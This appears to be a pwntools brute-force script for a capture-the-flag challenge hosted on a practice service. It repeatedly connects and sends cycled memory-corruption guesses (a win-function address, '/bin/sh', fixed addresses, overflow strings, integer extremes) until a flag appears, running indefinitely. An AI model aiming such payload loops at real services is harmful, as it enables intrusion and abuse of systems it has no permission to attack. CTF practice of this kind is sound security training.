#!/usr/bin/env python3
from pwn import *
import time
import itertools

context.log_level='critical'
elf=ELF('./image/challenge/challenge',checksec=False)
w=elf.symbols['win']

HOST='svc.pwnable.xyz'
PORT=30011

def t(payload_func):
    try:
        r=remote(HOST,PORT,timeout=3)
        result=payload_func(r)
        r.close()
        return result
    except:
        return None

def payload_standard(r,n1,a1,n2,a2,ops):
    r.recvuntil(b'>',timeout=1)
    for op in ops:
        if op=='C':
            r.sendline(b'1')
            r.recvuntil(b':',timeout=1)
            r.sendline(n1)
            r.recvuntil(b':',timeout=1)
            r.sendline(a1)
            r.recvuntil(b'>',timeout=1)
        elif op=='E':
            r.sendline(b'3')
            r.recvuntil(b':',timeout=1)
            r.sendline(n2)
            r.recvuntil(b':',timeout=1)
            r.sendline(a2)
            r.recvuntil(b'>',timeout=1)
        elif op=='P':
            r.sendline(b'2')
            r.recvuntil(b'>',timeout=1)
    
    r.sendline(b'2')
    d=r.recvall(timeout=1)
    if b'pwn{' in d or b'flag{' in d:
        return d.decode(errors='replace')
    return None

# Generadores de payloads
names_gen=itertools.cycle([
    b'A', p64(w), p32(w), b'/bin/sh\x00',
    p64(0x602268), p64(0x602030), b'X'*31,
])

ages_gen=itertools.cycle([
    b'0', b'1', str(w).encode(), b'-1',
    b'2147483647', b'-2147483648',
])

seqs_gen=itertools.cycle([
    ['C','E','P'],
    ['C','C','P'],
    ['C','E','E','P'],
    ['C','P','E','P'],
    ['C','E','C','P'],
])

count=0
start_time=time.time()

print(f"Starting continuous attack on {HOST}:{PORT}")
print(f"Will run indefinitely until flag is found...\n")

while True:
    count+=1
    n1=next(names_gen)
    a1=next(ages_gen)
    n2=next(names_gen)
    a2=next(ages_gen)
    seq=next(seqs_gen)
    
    result=t(lambda r: payload_standard(r,n1,a1,n2,a2,seq))
    
    if result:
        print(f"\n{'='*60}")
        print(f"FLAG FOUND AFTER {count} ATTEMPTS!")
        print(f"Time elapsed: {time.time()-start_time:.1f}s")
        print(f"n1={n1[:20]} a1={a1}")
        print(f"n2={n2[:20]} a2={a2}")
        print(f"seq={seq}")
        print(f"{'='*60}")
        print(result)
        break
    
    if count%100==0:
        elapsed=time.time()-start_time
        rate=count/elapsed
        print(f"[{count}] {rate:.1f} attempts/sec | Elapsed: {elapsed:.0f}s",end='\r')
    
    time.sleep(0.1)

